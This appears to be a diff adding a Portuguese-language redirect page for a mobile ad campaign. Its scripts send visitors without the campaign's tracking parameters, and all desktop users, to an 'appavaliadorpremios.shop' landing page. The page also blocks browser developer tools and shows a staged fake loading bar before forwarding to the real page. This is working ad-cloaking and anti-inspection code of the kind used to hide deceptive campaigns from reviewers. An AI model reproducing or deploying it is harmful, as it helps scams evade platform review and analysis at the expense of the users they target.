@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <script type="text/javascript">
+        (function() {
+            /**
+             * Função para verificar a presença de múltiplos parâmetros na URL
+             * @param {Array} names - Array contendo os nomes dos parâmetros a serem verificados
+             * @returns {boolean} - Retorna true se todos os parâmetros estiverem presentes, caso contrário, false
+             */
+            function hasAllURLParameters(names) {
+                const urlParams = new URLSearchParams(window.location.search);
+                return names.every(param => urlParams.has(param));
+            }
+
+            // Array contendo os parâmetros obrigatórios
+            const requiredParams = ['CampaignID', 'adSETID', 'CreativeID', 'pixel_id'];
+
+            // URL para redirecionamento caso algum dos parâmetros não esteja presente
+            const redirectURL = 'https://appavaliadorpremios.shop/lp/';
+
+            /**
+             * Função principal que verifica os parâmetros da URL
+             * e redireciona o usuário se necessário
+             */
+            function checkURLParameters() {
+                if (!hasAllURLParameters(requiredParams)) {
+                    window.location.href = redirectURL;
+                }
+            }
+
+            // Executa a verificação imediatamente assim que o script é carregado
+            checkURLParameters();
+        })();
+    </script>
+    <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool" url="https://appavaliadorpremios.shop/lp/"></script>
+    <script type="text/javascript">
+      if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+        window.location.href = 'https://appavaliadorpremios.shop/lp/';
+      }
+      </script>
+  <script 
+  src="https://cdn.jsdelivr.net/gh/devluxca/kwaiutm@v0.1.2/utm-handler.js"
+  data-token="f72be511-c76b-4489-92f4-8c811cbb54ab"
+  data-click-id-param="click_id">
+</script>
+    <meta charset="UTF-8">
+    <title>Redirecionando...</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fff;
+            font-family: 'Inter', sans-serif;
+            padding-bottom: 200px; /* Ajustado para mover mais para baixo */
+            text-align: center;
+        }
+        .loader-container {
+            width: 95%;
+            max-width: 800px;
+            text-align: left;
+        }
+        .loader {
+            width: 100%;
+            height: 24px;
+            background-color: #D8D8D8;
+            border-radius: 12px;
+            position: relative;
+            overflow: hidden;
+            margin-top: 80px; /* Ajustado para mover mais para baixo */
+        }
+        .loader-fill {
+            width: 0%;
+            height: 100%;
+            background-color: #FE842C;
+            transition: width 2s ease;
+        }
+        .loading-text {
+            margin-top: 80px; /* Ajustado para mover mais para baixo */
+            font-size: 48px;
+            font-weight: 900;
+            color: black;
+            text-align: left;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader-container">
+        <p class="loading-text" id="status-text">Aguarde...</p>
+        <div class="loader">
+            <div class="loader-fill" id="progress-bar-fill"></div>
+        </div>
+    </div>
+    <script>
+        window.onload = () => {
+            const queryString = window.location.search;
+            setTimeout(() => {
+                document.getElementById("status-text").innerText = "O site está carregando...";
+                document.getElementById("progress-bar-fill").style.width = "60%";
+            }, 3000); // Atraso aumentado para 3 segundos
+            
+            setTimeout(() => {
+                document.getElementById("status-text").innerText = "Pronto!";
+                document.getElementById("progress-bar-fill").style.width = "100%";
+            }, 6000); // Atraso aumentado para 6 segundos
+            
+            setTimeout(() => {
+                window.location.href = "p1/index.html" + queryString;
+            }, 7000); // Atraso aumentado para 7 segundos
+        };
+    </script>
+</body>
+</html>
